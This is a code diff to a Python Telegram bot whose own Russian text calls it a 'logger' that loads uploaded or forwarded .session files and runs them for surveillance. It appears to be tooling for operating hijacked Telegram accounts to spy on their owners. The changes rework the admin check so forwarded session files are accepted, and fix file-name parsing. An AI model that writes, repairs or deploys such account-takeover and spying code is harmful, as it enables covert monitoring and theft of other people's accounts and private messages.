@@ -93,14 +93,16 @@ async def start_all_session_files():
 
 # --- ИНТЕРФЕЙС УПРАВЛЕНИЯ БОТОМ ---
 
-@bot.on(events.NewMessage(pattern='/start', from_users=ADMIN_ID))
+@bot.on(events.NewMessage(pattern='/start'))
 async def send_welcome(event):
+    if event.sender_id != ADMIN_ID:
+        return
     buttons = [
         [Button.inline("📱 Список сессий", b"list_sessions")]
     ]
     await event.respond("👋 Привет! Я твой логер через загрузку <b>.session</b> файлов.\n\n"
                         "📂 <b>Как добавить аккаунт?</b>\n"
-                        "Просто отправь мне файл сессии (документом) прямо в этот чат!\n"
+                        "Просто отправь мне файл сессии (документом) или ПЕРЕШЛИ его прямо в этот чат!\n"
                         "Я сам скачаю его и мгновенно запущу в слежку.", buttons=buttons, parse_mode='html')
 
 @bot.on(events.CallbackQuery())
@@ -111,16 +113,24 @@ async def callback_handler(event):
         active_list = "\n".join([f"• <code>{name}.session</code>" for name in active_clients.keys()]) if active_clients else "Нет активных файлов сессий."
         await event.respond(f"🟩 <b>Сейчас работают сессии:</b>\n\n{active_list}", parse_mode='html')
 
-# --- ПРИЕМ ФАЙЛОВ .SESSION ИЗ ЧАТА ---
-@bot.on(events.NewMessage(from_users=ADMIN_ID))
+# --- ИСПРАВЛЕННЫЙ ПРИЕМ ФАЙЛОВ .SESSION (ПРИНИМАЕТ И ПЕРЕСЛАННЫЕ) ---
+@bot.on(events.NewMessage())
 async def handle_document(event):
+    # Проверяем, что сообщение прислал именно ты (неважно, переслано оно или нет)
+    if event.sender_id != ADMIN_ID:
+        return
+        
     if not event.document:
         return
         
-    file_name = event.document.attributes.file_name
-    
-    if not file_name.endswith(".session"):
-        await event.respond("❌ Мне нужны только файлы с расширением <code>.session</code>!", parse_mode='html')
+    # Ищем имя файла в атрибутах документа
+    file_name = None
+    for attr in event.document.attributes:
+        if hasattr(attr, 'file_name'):
+            file_name = attr.file_name
+            break
+            
+    if not file_name or not file_name.endswith(".session"):
         return
 
     if file_name == "main_bot_session.session":
@@ -156,7 +166,6 @@ async def handle_document(event):
 
 async def start_tg_bot():
     await bot.start(bot_token=BOT_TOKEN)
-    # ИСПРАВЛЕНО: убран await перед присваиванием переменной
     start_all_saved_accounts_task = asyncio.create_task(start_all_session_files())
     print("🤖 Системный бот запущен!")
     await bot.run_until_disconnected()
@@ -169,4 +178,4 @@ async def main():
 
 if __name__ == '__main__':
     asyncio.run(main())
-        
+            
